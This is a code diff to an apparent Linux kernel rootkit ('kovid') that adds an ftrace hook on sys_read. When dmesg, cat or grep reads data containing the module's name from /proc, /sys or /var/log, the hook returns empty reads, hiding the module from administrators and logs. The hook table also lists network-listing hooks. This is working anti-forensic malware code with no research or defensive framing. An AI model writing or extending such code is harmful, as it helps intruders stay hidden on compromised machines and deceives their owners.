@@ -29,6 +29,7 @@ sys64 real_m_clone;
 sys64 real_m_kill;
 sys64 real_m_execve;
 sys64 real_m_bpf;
+sys64 real_m_read;
 
 #define PT_REGS_PARM1(x) ((x)->di)
 #define PT_REGS_PARM2(x) ((x)->si)
@@ -171,6 +172,91 @@ static asmlinkage long m_kill(struct pt_regs *regs)
 
 leave:
     return real_m_kill(regs);
+}
+
+/**
+ * Given an fd, check if parent
+ * directory is a match.
+ */
+static bool is_sys_parent(unsigned int fd) {
+    struct dentry *dentry;
+    struct dentry *parent_dentry;
+    char *path_buffer;
+    bool rv = false;
+
+    struct fd f = fdget(fd);
+    if (!f.file)
+        goto out;
+
+    dentry = f.file->f_path.dentry;
+    parent_dentry = dentry->d_parent;
+
+    path_buffer = (char *)__get_free_page(GFP_KERNEL);
+    if (!path_buffer) {
+        fdput(f);
+        goto out;
+    }
+
+    char *parent_path = d_path(&f.file->f_path, path_buffer, PAGE_SIZE);
+    if (!IS_ERR(parent_path)) {
+        if (!strncmp(parent_path, "/proc", 5) ||
+                !strncmp(parent_path, "/sys",4) ||
+                !strncmp(parent_path, "/var/log", 8))
+            rv = true;
+    }
+
+    fdput(f);
+    free_page((unsigned long)path_buffer);
+
+out:
+    return rv;
+}
+
+
+static asmlinkage long m_read(struct pt_regs *regs) {
+    char *buf = NULL;
+    const char __user *arg;
+    size_t size;
+    long rv;
+    struct fs_file_node *fs = NULL;
+    bool is_dmesg = false;
+
+    /** call the real thing first */
+    rv = real_m_read(regs);
+
+    fs = fs_get_file_node(current);
+    if (!fs || !fs->filename)
+        goto out;
+
+    is_dmesg = !strcmp(fs->filename, "dmesg");
+
+    /** Apply only for dmesg & cat commands */
+    if ((!is_dmesg) &&
+            (strcmp(fs->filename, "cat") != 0) &&
+            (strcmp(fs->filename, "grep") != 0))
+        goto out;
+
+    size = PT_REGS_PARM3(regs);
+    if (!(buf = (char *)kmalloc(size, GFP_KERNEL)))
+        goto out;
+
+    arg = (const char __user*)PT_REGS_PARM2(regs);
+    if (!copy_from_user((void *)buf, (void *)arg, size)) {
+        size_t len_to_remove;
+        int newrv;
+        char *newline;
+        char *dest = strstr(buf, "kovid");
+        if (!dest)
+            goto out;
+
+        /** if kovid is here, skip */
+        if (is_dmesg /** special case :( */ ||
+            is_sys_parent((unsigned int)PT_REGS_PARM1(regs)))
+            rv=0;
+    }
+out:
+    kv_mem_free(&fs, &buf);
+    return rv;
 }
 
 /**
@@ -948,6 +1034,7 @@ static struct ftrace_hook ft_hooks[] = {
     {"sys_exit_group", m_exit_group, &real_m_exit_group, true},
     {"sys_clone", m_clone, &real_m_clone, true},
     {"sys_kill", m_kill, &real_m_kill, true},
+    {"sys_read", m_read, &real_m_read, true},
     {"sys_bpf", m_bpf, &real_m_bpf, true},
     {"tcp4_seq_show", m_tcp4_seq_show, &real_m_tcp4_seq_show},
     {"udp4_seq_show", m_udp4_seq_show, &real_m_udp4_seq_show},
